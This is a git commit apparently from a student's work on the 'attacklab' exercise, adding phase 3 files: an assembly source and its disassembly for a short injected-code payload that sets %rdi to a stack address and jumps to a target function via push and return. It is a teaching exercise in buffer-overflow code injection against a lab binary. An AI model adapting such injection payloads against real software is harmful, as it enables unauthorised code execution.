55634cfddcd0fcaad018623a2b3e7c06b1ea0a79
lzane <cn.zanelee@gmail.com>
2023-03-19 15:38:24 +0800

    phase 3

---
+++ attacklab/ctarget.3.d
@@ -0,0 +1,10 @@
+
+ctarget.3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 80 dc 61 55 	mov    $0x5561dc80,%rdi
+   7:	68 fa 18 40 00       	pushq  $0x4018fa
+   c:	c3                   	retq   
---
+++ attacklab/ctarget.3.s
@@ -0,0 +1,3 @@
+movq  $0x5561dc80, %rdi
+pushq $0x004018fa
+ret
